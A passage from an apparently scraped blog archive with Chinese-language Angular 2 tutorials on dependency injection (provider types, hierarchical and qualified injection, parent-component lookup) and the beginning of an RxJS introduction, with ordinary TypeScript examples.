Universal实现服务端渲染（ServerRender）。通过useClass属性来指定用那种渲染模式，因为渲染服务的最终接口没有变化（provide属性还是Render），对于调用者来说，业务代码也就不需修改：12345678910111213// 渲染方式var injector = Injector.resolveAndCreate([ &#123;provide: Render, useClass: DomRender&#125; // DOM渲染方式 // &#123;provide: Render, useClass: CanvasRender&#125; // Canvas渲染方式 // &#123;provide: Render, useClass: ServerRender&#125; // 服务端渲染方式]);// 调用方class ApplicationComponent &#123; constructor(_render: Render)&#123; _render.render(); // 渲染 &#125;&#125; 值Provider在实际开发中，依赖的对象不一定是类，也可以是常量、字符串、对象到呢个其他数据类型，这可以方便在全局变量、系统相关参数配置等场景中，在创建Provider对象时，只需要使用useValue就可以声明一个值Provider。123456789101112131415// ...let globalSetting = &#123; env: 'production', getHost: ()=&gt;&#123;return 'https://www.xxxx.com'&#125;&#125;;@Component(&#123; selector: 'some-component', template: `&lt;div&gt; ... &lt;/div&gt;`, providers: [ &#123;provide: 'urlSetting', useValue: globalSetting&#125;, // 对象 &#123;provide: 'NAME', useValue: 'SOME_NAME'&#125;, // 常量 ]&#125;)export class SomeComponent&#123;&#125; 值Provider依赖的值（通过useValue指定的值）必须在当前或者providers元数据配置之前定义，标识为NAME依赖的值在Provider中直接给出了定义（即&#39;SOME_NAME&#39;）。 别名ProvideruseExisting用来指定一个别名Provider，有了别名Provider就可以在一个Provider中配置多个标识，其对应的对象指向同一个实例，从而实现多个依赖，一个对象实例的作用。 假如有一个日志服务OldLoggerService，现有一个相同接口的新版服务NewLoggerService,考虑到重构代价等问题，并不去替换OldLoggerService服务被使用的地方，此时为了新旧服务同时可用，用于用useClass来积极这个问题：1234providers: [ &#123;provide: NewLoggerService, useClass: NewLoggerService&#125;, &#123;provide: OldLoggerService, useClass: NewLoggerService&#125;, ] 但是两个NewLoggerService却是不同的实例，而通过useExisting就可以将多个标识指向同一个实例。1234providers: [ &#123;provide: NewLoggerService, useClass: NewLoggerService&#125;, &#123;provide: OldLoggerService, useExisting: NewLoggerService&#125;, ] 工厂Provider有时依赖对象是不明确且动态变化的，可能需要根据运行环境、执行权限来生成，Provider需要一种动态生成依赖对象的能力，工厂Provider就用来解决这个问题，它暴露一个工厂方法，返回最终依赖的对象。 假设这样的场景，有些联系人的信息是保密的，只有特定权限的人才能看到，所以需要对每个登录用户进行鉴权。要达成目的，可以在构造函数中通过一个布尔值来判断是否有权限并返回对应的服务，在返回的服务中可以根据这个布尔值来判断是否显示联系人信息。 使用工厂Provider的注册方式需要用useFactory来声明Provider是一个工厂方法，deps是一个数组属性，指定了所需的依赖，可以注入到这个工厂方法中。123456789let contactServiceFactory = (_logger: LoggerService, _userService: UserService) =&gt; &#123; return new contactService(_logger, _userService.user.isAuthorized);&#125;export let contactServiceProvider = &#123; provide: ContactService, useFactory: contactServiceFactory, deps: [LoggerService, UserService]&#125;; 依赖注入在组件间通讯的运用组件间通讯的几种方式中包括父组件获取子组件引用的方法（通过ViewChildren的方式），反过来，在子组件获取父组件的实例就相对麻烦一些，但每个组件里的树立都会添加到注入器的容器里，因此可通过依赖注入来找到父组件的实例。 假设有一个父组件ParentComponent和一个子组件ChildComponent：12345678910111213// parent.component.ts@Component(&#123; selector: 'parent', template: ` &lt;div&gt; &#123;&#123; name &#125;&#125; &lt;child&gt;&lt;/child&gt; &lt;/div&gt; `&#125;)export class ParentComponent&#123; name = '父组件'&#125; 现在要在子组件中获取父组件的引用，分两种情况：已知父组件的类型这种情况可以直接通过在钩子函数中注入ParentComponent来获取已知类型的父组件引用。12345678910111213141516// child.component.tsimport &#123; ParentComponent &#125; from './parent.component';@Component(&#123; selector: 'child', template: ` &lt;div&gt; &#123;&#123; name &#125;&#125; &lt;div&gt;&#123;&#123; parent ? '获取父组件引用' : ''&#125;&#125;&lt;/div&gt; &lt;/div&gt; `&#125;)export class ChildComponent&#123; name = '子组件'; constructor(public parent: ParentComponent) &#123;&#125;&#125; 未知父组件的类型一个组件可能是多个组件的子组件，有时无法直接知道父组件的类型，在Angular中，可以通过“类-接口（Class-Interface）”的方式来查找，即让父组件通过一个与“类-接口”标识同名的别名来协助查找。 “类-接口”其实是一个抽象类，但被当做接口来使用，因为接口是TypeScript里才有的概念，编译后并不存在，因此Provider的标识不能是接口，只能是JS原生支持的对象（函数、字符串、对象等），所以“类-接口”既能提供接口的强类型约束，又能当做Provider的标识来用。 首先，创建Parent抽象类，它只声明了name属性，没有实现（赋值）：123export abstract class Parent&#123; name: string;&#125; 然后在ParentComponent组件的providers元数据中定义一个别名Provider，用useExisting来注入ParentComponent组件的实例：1234567891011121314// parent.component.ts@Component(&#123; selector: 'parent', template: ` &lt;div&gt; &#123;&#123; name &#125;&#125; &lt;child&gt;&lt;/child&gt; &lt;/div&gt; `, providers: [&#123;provide: Parent, useExisting: ParentComponent&#125;]&#125;)export class ParentComponent implements Parent&#123; name = '父组件'&#125; 若还有多层组件，建议任何父组件都应该实现一个单独的抽象类（如上的Parent抽象类），这样子组件就可以通过注入来找到父组件的实例，比如ParentComponent组件类。子组件通过Parent这个标识找到父组件的实例：123export class ChildComponent &#123; constructor(public parent: Parent)&#123; &#125;&#125;","categories":[{"name":"Angular","slug":"Angular","permalink":"https://github.com/xmoyKING/categories/Angular/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"typescript","slug":"typescript","permalink":"https://github.com/xmoyKING/tags/typescript/"},{"name":"angular","slug":"angular","permalink":"https://github.com/xmoyKING/tags/angular/"}]},{"title":"Angular2入门-依赖注入-1","slug":"angular10","date":"2017-10-17T01:30:04.000Z","updated":"2017-12-06T14:50:08.790Z","comments":true,"path":"2017/10/17/angular10/","link":"","permalink":"https://github.com/xmoyKING/2017/10/17/angular10/","excerpt":"","text":"依赖注入（Dependency Injection）是Angular实现重要功能的一种设计模式。大型应用通常涉及到很多组件和服务，这些组件和服务之间联系复杂多变，如何很好的管理它们之间的依赖关系是一个大问题，同时，也是一个框架是否优秀的硬指标。 传统的开发模式中，调用者负责管理所有对象的依赖，其中的循环依赖简直是噩梦，而在依赖注入模式中，这个管理权就交给了注入器（Injector），它在应用运行时（而不是发生在编译时）负责替换依赖对象，这称为控制反转（Inversion of Control，简写IoC），是依赖注入的关键。 依赖注入控制反转的概念是针对面向对象设计不断复杂化而提出的一种设计原则，是一种利用面向对象编程法则来降低应用耦合的设计模式。IoC强调的是对代码引用的控制权由调用方转移到外部容器，在运行时通过某种方式（比如反射）注入进来，实现控制翻转，降低服务类之间的耦合度。 依赖注入是最常用的一种实现IoC的方式，另一种是依赖查找。 在依赖注入模式中，应用组件无需关注所依赖对象的创建或初始化过程，可以认为框架已经初始化好了，只管调用即可。依赖注入有利于应用中各模块之间的解耦，使代码更易维护。随着项目复杂度增加，各模块、组件、第三方服务等相互调用更频繁，依赖注入优势越明显。开发者专注所依赖对象的消费，无需关注这些依赖的生产过程，提高了开发效率。 以创建一个Robot类为示例展示依赖注入的好处。12345678910111213// 不使用依赖注入export class Robot &#123; public head: Head; public arms: Arms; constructor()&#123; this.head = new Head(); this.arms = new Arms(); &#125; // 移动 move()&#123;&#125;&#125; Robot类现在仅包含Head、Arms等组件，行为也不复杂，但上面代码的问题在于，Robot在它自身的构造函数中创建并引用了Head和Arms的实例，这使得Robot类的扩展性差且难以测试。具体在于： 扩展性差Robot类通过Head和Arms创建了自己需要的组件，但若此时Head类的构造函数需要一个参数呢？只能通过this.head = new Head(parameter);的方式修改Robot类，或者需要给Robot类换一个OtherHead类。 难以测试当需要测试Robot类时，需要考虑Robot类隐藏的其他依赖，比如Head组件本身是否依赖于其他组件，且它依赖的组件是否又依赖另外的组件，Head组件的实例是否需要发送异步请求等。这些都是Robot不能控制的隐藏依赖，所以Robot很难被测试。那么，如何才能使Robot类变得容易扩展且易于测试呢？用依赖注入的方式改造：12345678910111213// 使用依赖注入export class Robot &#123; public head: Head; public arms: Arms; // 注意，此处注入的是Head和Arms的实例，不是Robot自身new出来的 constructor(public head: Head, public arms: Arms)&#123; this.head = head; this.arms = arms; &#125; // 移动 move()&#123;&#125;&#125; 调用时只需要把创建好的Head和Arms实例传入即可，如此，实现了Robot类和Head、Arms类的解耦，可以注入任何Head和Arms实例到Robot类的构造函数。无论是什么类型的Head和Arms1var robot = new Robot(new Head(), new Arms()); 依赖注入的一个典型应用场景就是测试，使用依赖注入方式编写的代码，测试人员在做场景覆盖测试时，基本上不需要修改被测试的程序，只需要注入依赖对象到被测试程序中即可。以测试Robot组件为例，将Head和Arms的mock对象传入到Robot类的构造函数中：123456789class MockHead extends Head&#123; head = '头部';&#125;class MockArms extends Arms&#123; arms = '手臂';&#125;var robot = new Robot(new MockHead(), new MockArms()); 依赖注入通过注入服务的方式替代了组件里初始化所依赖的对象，从而避免了组件之间的紧耦合，但还不够彻底，因为使用Robot类时还需要手动创建Head、Arms以及Robot的实例，为了减少重复操作，可以通过创建一个Robot的工厂类来解决(工厂类并不是依赖注入的常用做法，仅仅为了引出注入器Injector的概念)：12345678910111213141516// Robot工厂类import &#123; Head, Arms, Robot &#125; from './robot';export class RobotFactory &#123; createRobot()&#123; let robot = new Robot(this.createHead(), this.createArms()); return robot; &#125; createHead()&#123; return new Head(); &#125; createArms()&#123; return new Arms(); &#125;&#125; Angular的依赖注入框架（Dependency Injection Framework）就像上面的工厂类一样，替开发者完成了各种实例化的过程，这样开发者不需要去关心需要定义那些依赖、以及把这些依赖注入给谁，因为依赖注入提供了注入器（Injector），它会帮助创建需要的类实例,例如要创建一个Robot类实例：12var injector = new Injector();var robot = injector.get(Robot); 有了注入器，Robot就不需要知道如何创建它所依赖的Head和Arms，用户也不需要知道如何生产一个Robot，同时也不需要维护一个巨大的工厂类。 Angular中的依赖注入通过上面Robot的例子了解了依赖注入的概念，了解Angular的依赖注入需了解3个概念： 注入器（Injector）：就像工厂，提供了一系列的接口用于创建依赖对象的实例 Provider：用于配置注入器，注入器通过它来创建被依赖对象的实例，Provider把标识（Token）映射到工厂方法，被依赖的对象就是通过该方法来创建的 依赖（Dependence）：指定了被依赖对象的类型，注入器会根据此类型创建对应的对象在依赖注入中，注入器是粘合剂，它链接了调用方和被依赖方，注入器根据Provider的配置来生成依赖对象，调用方根据Provider提供的标识告诉注入器来获取被依赖的对象。 以Angular中如何使用依赖注入获取一个Robot实例为例：123var injector = new Injector(...);var robot = injector.get(Robot);robot.move(); // 调用robot方法 Injector()的实现如下，该类暴露一些静态方法用来创建injector注入器：123456import &#123; ReflectiveInjector &#125; from '@angular/core';var injector = ReflectiveInjector.resolveAndCreate([ Robot, Head, Arms]); resolveAndCreate()是一个工厂方法，它通过接收Provider数组来创建injector注入器，Provider数组说明了如何创建这些依赖，事实上，上面的Provider数组相当于下面代码的简写：12345var injector = ReflectiveInjector.resolveAndCreate([ &#123;provide: Robot, useClass: Robot&#125;, &#123;provide: Head, useClass: Head&#125;, &#123;provide: Arms, useClass: Arms&#125;]); Provider对象字面量（形如{provide: Robot, useClass: Robot}）把一个标识映射到一个可配置的对象，这个标识可以是一个类名，也可以是字符串。有了Provider, Angular不仅知道使用了那些依赖，也知道这些依赖是如何被创建的。那么注入器到底是如何知道初始化Robot需要的依赖是Head和Arms呢？ 其实，在Robot的构造函数声明中，它的参数说明了Robot类需要的依赖：1constructor(public head: Head, public arms: Arms)&#123;&#125; 在Angular中，上述关于创建注入器（即var injector = ReflectiveInjector.resolveAndCreate([...])）是不需要开发者编写的，Angular的依赖注入框架已经完成了注入器的生成和调用。 在组件中注入服务Angular在底层做了大量初始化工作，这大大简化了创建依赖注入的过程，在组件中使用依赖注入需要完成下面3步： 通过import导入被依赖对象的服务 在组件中配置注入器，在启动组件时，Angular会读取@Component装饰器里的providers元数据，它是一个数组，配置了该组件需要使用到的所有依赖，Angular的依赖注入框架会根据这个列表去创建对应对象的实例 在组件构造函数中声明需要注入的依赖，注入器会根据构造函数上的声明，在组件初始化时通过第二步中providers元数据配置依赖，为构造函数提供对应的依赖服务，最终完成注入的过程。 以通讯录为例，展示如何实现在组件里注入服务：1234567891011121314151617181920212223// app.component.tsimport &#123; Component &#125; from '@angular/core';// 1. 导入被依赖的服务import &#123; ContactService &#125; from './shared/contact.service';import &#123; LoggerService &#125; from './shared/logger.service';import &#123; UserService &#125; from './shared/user.service';@Component(&#123; moduleId: module.id, selector: 'contact-app', // 2. 在组件中配置注入器 providers: [ContactService, LoggerService, UserService], templateUrl: './app.component.html', styleUrls: ['./app.component.css']&#125;)export class ContactAppComponent &#123; // 3.在组件构造函数中声明需要注入的依赖 constructor( contactService: ContactService, logger: LoggerService, userService: UserService )&#123;&#125;&#125; 在ContactAppComponent这个根组件中配置了providers元数据，这使得ContactAppComponent及其所有子组件，都能共享由根组件注入器创建的实例。 但每个组件都可以有自己的注入器，通过依赖注入到该组件的每个服务都维持单例，若某个组件不希望复用从根组件注入器获取的服务，可以在自己的注入器中以新的配置重新注入，这被称为“层级注入”，是Angular依赖注入的另一个特性。 如下例，CollectionComponent是ContactAppComponent的子组件，它并没有在@Component中添加providers元数据来注入ContactService服务，但是依然可以在构造函数中获取到ContactService服务的实例：12345678910111213141516// collection.component.tsimport &#123; Component, OnInit &#125; from '@angular/core';import &#123; ContactService &#125; from './shared/contact.service';@Component(&#123; // 注：此处没有声明providers元数据 selector: 'call-record', templateUrl: 'app/collection/collection.component.html', styleUrls: ['app/collection/collection.component.css']&#125;)export class CollectionComponent implements OnInit &#123; collections: any = []; contacts: any = &#123;&#125;; constructor(private _contactService: ContactService) &#123;&#125;&#125; ContactService更新是整个模块内通用的服务，适合在全局注入，整个模块共享一个实例即可，无需在具体组件中创建相应的实例。 在服务中注入服务除了组件依赖服务，服务间的相互调用也很常见。例如在ContactService服务中，若希望在服务异常时记录错误信息，可以创建一个单独的日志服务来处理。 先定义一个简单的日志服务：12345678import &#123; Injectable &#125; from '@angular/core';@Injectable()export class LoggerService &#123; log(message: string)&#123; console.log(message); &#125;&#125; 在ContactService服务中注入LoggerService:1234567891011121314// contact.service.tsimport &#123; Injectable &#125; from '@angular/core';import &#123; LoggerService &#125; from './logger.service';import &#123; UserService &#125; from './user.service';@Injectable() // 1.添加@Injectable装饰器export class ContactService&#123; // 2. 构造函数中注入所依赖的服务 constructor( _logger: LoggerService, _userService: UserService )&#123;&#125; getCollections()&#123; this._logger.log('Getting contacts ... '); &#125;&#125; 然后需要在组件中注册这个日志服务，日志服务可被多个模块调用，一般在根模块的providers元数据中注册它。12// 3. 在providers元数据中注册服务providers: [ContactService, LoggerService, UserService] 注意ContactService, LoggerService虽然都使用了@Injectable装饰器，但LoggerService的装饰器不是必须的（但推荐在服务定义时都写上），因为只有当一个服务依赖其他服务的时候才需要用@Injectable显示装饰。而LoggerService没有依赖其他服务，所以它可以不用@Injectable装饰，而ContactService服务依赖了其他服务，@Injectable是必须的。 在模块中注入服务在根组件中注入的服务，所有的子组件都能共享这个服务，当然通过模块注入服务也可以达到一样的效果。 但模块中注入服务和之前的注入场景不同，Angular在启动程序时会启动一个根模块，并加载它所依赖的其他模块，此时会生成一个全局的根注入器，由该注入器创建的依赖注入对象在整个应用级别都可见，并共享一个实例。同理，根模块会指定一个根组件并启动，由该根组件添加的依赖注入对象是组件树级别可见的，在根组件以及子组件中共享一个实例。 在模块中添加依赖注入如下例：1234567891011121314151617181920// app.module.tsimport &#123; NgModule &#125; from '@angular/core';import &#123; BrowserModule &#125; from '@angular/platform-browser';import &#123; AppComponent &#125; from './app.component';import &#123; LoggerService &#125; from './shared/logger.service';import &#123; UserService &#125; from './shared/user.service';// 假设有单独的通讯录模块import &#123; ContactModule &#125; from './contact.module';@NgModule(&#123; imports: [ BrowserModule, ContactModule ], declarations: [AppComponent], providers: [LoggerService, UserService], bootstrap: [AppComponent]&#125;)export class AppModule&#123;&#125; Angular倡导模块化开发，所以将通讯录功能作为独立的功能模块封装到ContactModule模块中，并通过import导入，实现模块间的松耦合。在providers元数据中注册了LoggerService、UserService两个服务，可以在应用级别内的其他模块都共用这两个服务。 Angular中没有模块级作用域这个概念，只有应用级别作用域和组件级别作用域，这是为了模块的扩展性，一个应用通常由多个模块合并而成，在@NgModule里注册的服务默认就可在整个应用内可用。 注：延迟加载模块是例外，模块的延迟加载使得应用在启动时不被载入，而是结合路由配置，在需要时才动态加载相应模块。Angular会对延迟加载模块初始化一个新的执行上下文，并创建一个新的注入器，在该注入器注入的依赖只在该模块内部可见，算是模块级作用域的特例。 若在多个模块中都注入相同标识的服务怎么办？假设在根模块先后导入了ContactModule和MsgModule两个模块import: [ContactModule, MsgModule]。而在ContactModule和MsgModule模块都注入了相同Token标识的服务，因为根注入器只有一个，后面初始化的模块服务会覆盖前面初始化的模块服务。MsgModule初始化的服务会覆盖ContactModule中初始化的服务，而且即使是ContactModule模块里的组件，这些组件若引入的是同一个Token标识的服务，那么这些组件引入的服务还依然会是MsgModule模块里注入的那个服务实例。 另外一个情况，假如ContactModule导入MsgModule，这种情况下，应用里使用的服务会是ContactModule中的注入服务，而不是MsgModule里的，按这种结论延伸，在根模块里注入的服务始终都是有最高优先级的，所以根模块里注入的服务可以放心使用。 推荐是在根模块中集中管理其他模块的导入，通过providers元数据完成配置；另外，可以利用模块延迟加载的特性，在延迟模块中注入依赖；或者在模块的根组件中注入，这些都可以避免多模块的同标识污染问题。 而服务是在模块中注入还是在根组件中注入？主要取决于该服务的应用场景，在模块中注入的服务的作用域是应用级的，比如日志等工具类服务可能会在多个模块中调用，更适合模块中注入。而类似ContactService、MgsService等与业务场景相关的服务，可在相关模块的根组件中注入。由于存在延迟加载模块调用得不到组件级作用域里服务的情况，若一个服务需要被延迟加载的模块调用，也应该在根模块中注入。最后，若不确定一个服务将来是否会被外部模块调用，可以优先考虑在模块中注册。 层级注入Angular以组件为基础，而项目中组件会有层层嵌套的情况，这种组织关系组成了组件树。根组件下面是各层级的子组件，被注入的依赖对象就像是每棵树上的果实，可以出现在任何层级的任何组件中，每个组件可以拥有一个或多个依赖对象的注入，每个依赖对象对于注入器而言都是单例。更深入的是，依赖注入可以传递到子孙组件中去，子组件可以共享父组件中注入的实例，无需再创建。 每个组件都有自己对应的注入器(但不是每个组件都为自己创建独立的注入器，也有可能是共享其他组件的注入器)，由这个注入器创建的Provider都是单例，这是组件级别的单例，跟AngularJS1不一样，AngularJS1只有全局单例。 以如下通讯录别表为例，假设通讯录需要给个通讯录子项生成一个唯一标识，可以在子组件中注入随机数服务来实现：1234567891011121314151617181920212223242526272829303132333435363738394041424344// 生成唯一标识的服务@Injectable()export class Random &#123; constructor()&#123; this.num = Math.random(); &#125;&#125;// 子组件A@Component(&#123; selector: 'contact-a', providers: [Random], // 单例 template:`&lt;div&gt;ContactA: &#123;&#123; random.num &#125;&#125;&lt;/div&gt;`&#125;)export class ContactAComponent &#123; constructor(r: Random)&#123; this.random = r; &#125;&#125;// 子组件B@Component(&#123; selector: 'contact-b', providers: [Random], // 单例 template:`&lt;div&gt;ContactB: &#123;&#123; random.num &#125;&#125;&lt;/div&gt;`&#125;)export class ContactBComponent &#123; constructor(r: Random)&#123; this.random = r; &#125;&#125;// 父组件@Component(&#123; selector: 'contact-list', template:` Contact List: &lt;contact-a&gt;&lt;/contact-a&gt; &lt;contact-b&gt;&lt;/contact-b&gt; `&#125;)export class ContactListComponent &#123; constructor()&#123; &#125;&#125; 上述代码的ContactA和ContactB输出的随机数完全不同，说明每个子组件都创建了自己独立的注入器，也就是说通过依赖注入的Random服务都是独立的，若将providers元数据配置改一下，把注入器提升到父组件中，那么两个子组件输出的随机数结果是一样的。 Angular这种灵活的设计引出了一个问题：是在根组件还是在子组件中进行服务注入？这取决于想让注入的依赖服务具有全局性还是局部性，由于每个注入器总是将它提供的服务维持单例，因此，若不需要针对每个组件都提供独立的服务单例，就可以在根组件注入，整个组件树共享根注入器提供的服务实例，如日志工具类等。反之，就应该在各子组件中配置providers元数据来注入服务。 另一个问题：Angular是如何查找到合适的服务实例的呢？在组件的构造函数试图注入某个服务的时候，Angular会先从当前组件的注入器查找，找不到就继续往父组件的注入器查找，然后直到根组件注入器，最后到应用根注入器（即模块注入器），此时若还是找不到则报错。注：限定依赖注入是例外，它可以控制查找的范围，即使找不到也不会报错。 注入服务的查找路径如下图： 注入到派生组件一个组件可以派生（Inherit）自另外一个组件，对应有继承关系的组件，当父类组件和派生类组件有相同的依赖注入时，若父类组件注入了这些依赖，派生组件也需要注入这些相同的依赖，并在派生类组件的构造函数中通过super()往上传递。 组件本质上是一个类，而类有继承的关系，所以一个组件可以继承另外一个组件。但派生类组件不能继承父类组件的注入器，二者的注入器对象并没有任何关系，而且需要注意的是，因为父类组件的运行可能需要依赖注入某些服务，所以派生类组件也必须注入父类组件依赖的服务，然后调用super()将对应的注入服务传递到父类。父组件跟子组件，父类组件跟派生类组件的称谓，前者是聚合关系，后则是继承关系。 假设需要对返回的通讯录列表排序，可以创建一个实现排序功能的派生组件：123456789101112131415161718// 父类组件@Component(&#123; selector: 'contact-app', providers: [ContactService], templateUrl: 'app/contact-app.component.html'&#125;)export class ContactAppComponent implements OnInit &#123; collections: any = &#123;&#125;; constructor(protected _contactService: ContactService)&#123;&#125; ngOnInit()&#123; this._contactService.getCollections().subscribe(data =&gt; &#123; this.collections = data; this.afterGetContacts(); &#125;); &#125; protected afterGetContacts()&#123;&#125;&#125; 实现排序功能的派生组件：123456789101112131415161718192021// 派生组件@Component(&#123; selector: 'contact-app', providers: [ContactService], templateUrl: 'app/contact-app.component.html'&#125;)// 继承ContactAppComponent组件export class SortedContactAppComponent extends ContactAppComponent &#123; // 在派生组件中注入 constructor(protected _contactService: ContactService)&#123; super(_contactService); // 往父类组件传递 &#125; ngOnInit()&#123;&#125; protected afterGetContacts()&#123; this.collections = this.collections.sort((h1,h2)=&gt;&#123; return h1.name &lt; h2.name ? -1 : (h1.name &gt; h2.name ? 1 : 0); &#125;); &#125;&#125; 在派生组件的providers注入是必须的，因为注入器不能从父类继承，但若把providers配置ContactService放到模块中，那么父类和派生类都不需要配置了，因为它们都共享一个ContactService实例。 Angular推荐的最佳实践是构造函数越简单越好，尽量只负责类似变量初始化这样的操作，业务逻辑应移到ngOnInit()中处理，这有利于组件的单元测试。 限定方式的依赖注入一般的，注入都是假定依赖对象是存在的，但实际上并非如此，比如上层提供的Provider被移除，导致了之前注入的依赖可能已经不存在了，此时按照普通的依赖注入方式进行相关服务的调用会出错。所以Angular依赖注入框架提供了@Optional和@Host装饰器来解决这个问题。 Angular的限定注入方式使得开发者能够修改默认的依赖查找规则，@Optional可以兼容依赖不存在的情况，提供系统健壮性，@Host可以限定查找规则，明确实例初始化的位置，避免一些莫名的共享对象问题。 在Angular中实现可选注入很简单，在宿主组件（Host Component）的构造函数中增加@Optional()装饰器即可：1234567891011121314import &#123; Optional &#125; from '@angular/core';import &#123; LoggerService &#125; from './shared/logger.service';//...export class ContactListComponent &#123; constructor( @Optional() private logger: LoggerService )&#123; if(this.logger)&#123; this.logger.log('hello'); &#125; &#125;&#125; 这样就能兼容LoggerService服务不能存在的情况了（实际上，LoggerService这个类的定义还是存在的，不存在是指这个类虽然定义了，但没有准备好，没有在相应的组件或模块中通过providers元数据来配置它）。 另外，依赖查找的规则是按照注入器从当前组件向父级组件查找，直到找到要注入的依赖为止，但当需要限制这种查找规则，比如限定查找的路径截止在宿主组件不再继续向上查找时，就可以使用@Host装饰器了。所谓的宿主组件是指若一个组件注入了依赖项，那么该组件就是这个依赖项的宿主组件，但若这个组件通过ng-content被嵌入到父组件，那么这个父组件就是该依赖项的宿主组件。 宿主组件是当前组件在通讯录例子中，因为LoggerService服务已经在顶层组件里通过providers元数据配置，根据查找规则，最终会在顶层组件里查找到依赖，代码可以运行。 若加入@Host装饰器来限定查找规则只停止于当前组件，那么Angular在当前组件中找不到时就会报错，当然，若结合@Optional则可以跳过此检查。12345678910@Component(&#123; selector: 'contact-list' template: `&lt;contact-a&gt;&lt;/contact-a&gt;`&#125;)export class ContactListComponent &#123; constructor( @Host() // 出错！因为在当前宿主租价那种找不到LoggerService实例 logger: LoggerService )&#123;&#125;&#125; 结合@Optional跳过检查：1234567export class ContactListComponent &#123; constructor( @Host() @Optional() // 为LoggerService加上可选参数 logger: LoggerService )&#123;&#125;&#125; 宿主组件是父组件修改父组件ContactListComponent和子组件ContactAComponent的代码，在子组件中注入LoggerService服务，并将子组件通过ng-content的方式嵌入到父组件中。 组件定义如下：1234567891011121314151617181920// ContactListComponent组件@Component(&#123; selector: 'contact-list', providers: [LoggerService], template: `&lt;ng-content&gt;&lt;/ng-centent&gt;` //ContactAComponent组件模板的内容将会被嵌入到此处&#125;)export class ContactListComponent &#123;&#125;// ContactAComponent组件@Component(&#123; selector: 'contact-a', template: `&lt;div&gt;ContactA&lt;/div&gt;`&#125;)export class ContactAComponent &#123; constructor( @Host() @Optioanl() logger: LoggerService )&#125; 因为子组件通过ng-content的方式嵌入到父组件中，所以父组件是宿主，最终在子组件中注入的LoggerService服务会向上找到父组件配置的LoggerService服务。","categories":[{"name":"Angular","slug":"Angular","permalink":"https://github.com/xmoyKING/categories/Angular/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"typescript","slug":"typescript","permalink":"https://github.com/xmoyKING/tags/typescript/"},{"name":"angular","slug":"angular","permalink":"https://github.com/xmoyKING/tags/angular/"}]},{"title":"Angular2入门-RxJs","slug":"angular9","date":"2017-10-16T08:00:10.000Z","updated":"2017-12-06T14:50:08.836Z","comments":true,"path":"2017/10/16/angular9/","link":"","permalink":"https://github.com/xmoyKING/2017/10/16/angular9/","excerpt":"","text":"响应式编程响应式编程（Reactive Programming）是一种面向数据流（Data Flows）和变化传播（the Propogation of Change）的编程范式。 所谓的面向变化传播就是看最初的数据是否会随着后续对应变量的变化而变化，比如3个变量的表达式C = A + B，A和B有初始值，这行语句第一次执行后，C的值会被计算出来。在命令式编程（Imperative Programming）中，当B的数值改变后，C的数值并没有随着B的数值改变而改变，除非再次执行这行语句。而在响应式编程中，不用再次执行，随着B的改变，C的值也会改变。 在MVVM模型中，M（Model）到V（View）的绑定关系如下图，当model由model1变为model2时，view也随之变化，由view1变为view2，也体现了响应式编程中面向变化传播的思想: 面向数据流当监听一系列事件流并对这一系列事件流进行映射、过滤和合并等处理后，再响应整个事件流的回调，这个过程便属于面向数据流的编程。例如ReactiveX的编程范式中，数据流被封装在一个叫做Observable的对象实例中，通过观察者模式，对数据流进行统一的订阅（Subscribe），并在中间插入像filter()这样的操作函数，从而对Observable所封装的数据流进行过滤处理：1myObservable.filter(fn).subscribe(callback); 响应式编程清晰地表达了动态的异步数据流，而相关的计算模型也自动地将变化的值通过数据流的方式进行了传播。 ReactiveXReactiveX（Reactive Extensions）简写为Rx，最初是微软开发并维护的基于Reactive Programming范式实现的一套工具库集合，后来开源，提供一系列接口规范来帮助开发者更方便地处理异步数据流。Rx系列结合了观察者模式、迭代器模式和函数式编程。 Observable介绍在Rx中，最核心的概念就是Obserable，应用中产生的异步数据都需要先包装成Observable对象，Observable对象的作业是把这些异步的数据变换为数据流形式，所以生成的这些Observable对象相当于数据流的源头，后续的操作都是围绕着这些被转换的流动数据展开。上图中，最上面的时间线代表了最初的Observable对象，这个Observable数据流对外发出了3个数据，这3个数据可能是3次点击事件所携带的数据，也可能是3次网络请求返回的数据，经过map操作的时候，原来的Observable对象会变成一个新的Observable对象，并且原来的3个数据会转换成新的数据在新的Observable对象数据流里流动。 这样的操作实际上与车间生产流水线非常相似，Observable对象相当于半成品输入，而上述的map操作相当于流水线的工人，加工后最终输出成品，而这个map操作在Rx中称为Operator，这样的操作更新是对一个事件集合做过滤处理，生成一个新的事件集。Rx借鉴了集合的操作思想，把复杂的异步数据流的处理问题，简化成了同步的集合处理问题。 简而言之，Rx中，通过Observable对象，可以像操作集合一样操作复杂的异步数据流。 Operator介绍Rx在结合了观察者模式的同时，还结合了函数式编程和迭代器模式的思想，其中、Rx的Operator便是对这两种编程模式的具体体现。 Operator，即Rx中Observable对象的操作符，在Rx中，每一个Observable对象，或者说数据流，都可以通过某个Operator对该Observable对象进行变换、过滤、合并和监听等操作。同时、大多数的Operator在对Observable对象处理后都会返回一个新的Observable对象供下一个Operator进行处理，这样方便在各个Operator之间通过链式调用的方式编写代码。1let newObservable = observable.debounceTime(500).take(2); // 生成新的Observable对象 上述代码中debounceTime()以及take()都是Operator。 在Rx中，Observable作为观察者模式中的被观察者，需要一个方法来订阅它，而subscribe()便是这个方法，订阅Observable对象发出的所有事件：1observable.subscribe(observer); subscribe()方法接收一个observer作为参数，来对Observable发出的事件进行订阅，每当Observable对象完成并发送（Emit）一个事件时，该事件就会被observer所捕获，进入到observer对应的回调函数中。被subscribe()订阅过的Observable对象并不会返回一个新的Observable对象，因为subscribe()不是一个可以改变原始数据流的函数。相反，subscribe()会返回一个Subscription实例，这个Subscription实例提供了很多操作API，如取消订阅事件的unsubscribe()方法等。 其他核心概念除了Observable对象和Operator，Rx还有其他核心概念： Observer：对Observable对象发出的每个事件进行响应 Subscription：Observable对象被订阅后返回的Subscription实例 Subject：EventEmitter的等价数据结构，可以当做Observable被监听，也可以作为Observer发送新的事件 RxJSRx继承自响应式编程范式，已经在多种语言中实现，除了在JS层面上的实现RxJS外，还有RxJava、Rx.Net、RxSwift等。 创建Observable对象以一个简单示例开始，首先把数据流封装为统一的Observable对象，并对其进行处理：123let button = document.querySelector('button');Rx.Observable.fromEvent(button, 'click') // 返回一个Observable对象 .subscribe(() =&gt; console.log('Clicked')); 通过Observable中的fromEvent静态方法（Static 